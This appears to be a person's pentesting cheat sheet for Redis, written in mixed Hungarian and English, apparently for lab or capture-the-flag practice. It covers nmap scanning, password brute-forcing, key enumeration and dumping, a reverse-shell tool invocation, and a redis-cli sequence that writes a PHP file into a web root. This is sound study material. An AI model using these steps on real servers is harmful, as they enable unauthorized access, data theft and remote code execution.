# Redis
## scanning
* nmap -Pn -v 10.10.10.3 -p6379 -sV --script=redis-info
* nc -nv 10.10.10.3 6379 (kapcsolodik e... kb ennyi a lenyeg)
* redis-cli -h 10.10.10.3
  * (ha nem talalja a rendszer, akkor sudo apt install redis-tools)
* (redis-cli)# info
  * ha ezt irja -NOAUTH Authentication required. akkor authentikaciora van szukseg
## credentials
* hogyha hozzaferunk a redis.conf file-hoz akkor lehet hogy van benne usernev es jelszo (a jelszo lehet rendes vagy temporary jelszo)
  * masteruser -> username mezo
  * requirepass -> jelszo mezo
* ha nincs 'masteruser', akkor a usernev fixen 'default'
* minden nem kikommentelt sor keresese redis config fajlban
  * cat ./redis.conf | grep -P '^[^#].*'
* kivulrol nem lehet kideriteni, hogy adtak e meg usernevet masikat vagy a 'default' a usernev
  * csak akkor tudjuk, hogyha hozzaferunk a config fajlhoz
## bruteforcing password
* nmap -Pn -v 10.10.10.3 -p6379 -sV --script=redis-brute
* nmap -Pn -v 10.10.10.3 -p6379 -sV --script=redis-brute --script-args=userdb=./users.txt,passdb=./passwords.txt
* msf module...
* etc
## login with valid credentials
* ha kell megadni usernevet
<pre>
 $ redis-cli -h 10.10.10.3
 redis-cli# AUTH username password
 +OK
</pre>
* ha nincs usernev, vagyis a usernev a 'default' mert nem lett a config fajlban implementalva
  * akkor usernev nelkul kell authentikalni
<pre>
 $ redis-cli -h 10.10.10.3
 redis-cli# AUTH password
 +OK
</pre>
## server enumeration after successfull login (credentials needed) (or anonymous access needed)
* most important commands
<pre>
 redis-cli# INFO
 redis-cli# client list
 redis-cli# CONFIG GET * (ket sorba tordeli a key value parokat)
 redis-cli# monitor (monitoring requests)
 redis-cli# slowlog get 25 (get the top 25 slowest queries)
</pre>
* all commands
  * https://redis.io/docs/data-types/
  * https://lzone.de/cheat-sheet/Redis
  * https://lzone.de/cheat-sheet/Redis
* commands can be disabled and command names can be modified with alias
  * it can be done in the config file
  * modifying commands (e.g. FLUSHDB)
    * rename-command FLUSHDB "NEWFLUSHDB"
  * disable commands (e.g. FLUSHDB)
    * rename-command FLUSHDB ""
## database enumeration
### basic enumeration
<pre>
 INFO keyspace (list databases)
 SELECT 1 (select nth database, indexed from 0)
 KEYS * (list keys of selected database)
 GET key_name (view specified record) (lehet hogy double qoute koze kell rakni a key nevet)
</pre>
* plus info
  * In that example the database 0 and 1 are being used. Database 0 contains 4 keys and database 1 contains 1. By default Redis will use database 0. In order to dump for example database 1 you need to do:
### error -WRONGTYPE Operation against a key holding the wrong kind of value
* In case you get the follwing error -WRONGTYPE Operation against a key holding the wrong kind of value while running GET <KEY> it's because the key may be something else than a string or an integer and requires a special operator to display it.
* To know the type of the key, use the TYPE command, example below for list and hash keys.
<pre>
 TYPE key_name
 [ ... Type of the Key ... ]
 LRANGE key_name 0 -1
 [ ... Get list items ... ]
 HGET key_name field_name
 [ ... Get hash item ... ]
</pre>
## dump the whole redis database
* Dump the database with npm redis-dump or python redis-utils
  * https://www.npmjs.com/package/redis-dump
  * https://pypi.org/project/redis-utils/
## redis RCE
### interactive shell and reverse shell
* https://github.com/n0b0dyCN/redis-rogue-server
* redis-rogue-server can automatically get an interactive shell or a reverse shell in Redis(<=5.0.5).
* $ python3 redis-rogue-server.py --rhost=10.10.71.180 --lhost=127.0.0.1
  * ki kell valasztani a menubol hogy interactive shell-t akarunk vagy reverse shell-t
  * ha reverse shell -t, akkor kell inditani egy listenert
* lehetseges olyan hogy nem megy tovabb es megall annal a resznel hogy 'setting dbfilename'
### php webshell
* https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html
* You must know the path of the Web site folder:
<pre>
 $ redis-cli -h 10.10.10.3
 10.10.10.3:6379> config set dir /usr/share/nginx/html
 OK
 10.10.10.3:6379> config set dbfilename redis.php
 OK
 10.10.10.3:6379> set test "<?php phpinfo(); ?>"
 OK
 10.10.10.3:6379> save
 OK
</pre>
### egyeb lehetosegek a hacktricks leirasban kifejtve...
* https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
## source
* https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
